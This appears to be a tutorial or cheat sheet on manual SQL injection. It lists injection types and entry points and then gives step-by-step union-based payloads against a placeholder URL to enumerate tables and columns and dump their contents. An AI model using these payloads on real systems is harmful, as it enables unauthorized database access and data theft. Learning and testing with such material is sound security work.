# sql injection

SQL injection is a technique where a malicious user can inject SQL Commands into an SQL statement via a web page.

#### Type of SQL Injection

* In Band
* Out of Band
* Blind SQLI

#### SQLI Exploitation Technique


* Error Based Exploitation
* Union Based Exploitation
* Boolean Based Exploitation
* Time-Based Delay Exploitation
* Out of Band Exploitation

#### Try to Identify- where the application interact with DB


* Authentication Page
* Search Fields
* Post Fields
* Get Fields
* HTTP Header
* Cookie

#### Basic sql Functions

cmd | Description
----|-----------
SELECT |	read data from the database based on search criteria
INSERT |	insert new data into the database
UPDATE |	update existing data based on given criteria
DELETE |	delete existing data based on given criteria
Order By |	used to sort the result-set in ascending or descending order
Limit By |	the statement is used to retrieve records from one or more tables


#### Exploit

###### Break the Query

* first we break the query using Character String Indicators `‘ “  \` . by breaking query we get sql error. Example.

` You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ”1” LIMIT 0,1′ at line 1 `

* * * 

##### Fix the Query

* next we Fix the query using comment `# or – -(hyphen hyphen)`

* * * 

##### order clause

* Now we will try to add query between the quote and comment to get information from the database

* We used `SELECT` query to get information from database. to execute two `SELECT` querty we need to use `UNION` in between select queries. but `Union` have precondition that number of columns in both select statement should be same. so next we need to find out number of columns. we find out number of columns using `order by`

*ORDER BY clause will arrange the result set in ascending or descending order of the columns used in the query.*

`http://target.com/product?id=2' order by 1,2,3 --`

* * * 

###### find vuln columns

* now we can use `UNION` operator with another `SELECT` query.next we find the columns to get output.

`http://target.com/product?id=2' union select 1,2,3 --` it will display columns number which we use to extract information from database.

* * * 


###### find tables in database.

`http://target.com/product?id=2' union select 1,table_name,3 from information_schema.tables where table_schema=database() --`

Get all table names

`http://target.com/product?id=2' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --`

* * *

###### finding columns in tables

`http://target.com/product?id=2'  union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --`

* * * 

###### To get Content of columns

`http//target.com/product?id=2' union select 1,group_concat(coumns_name),3 from table_name --`

* * * 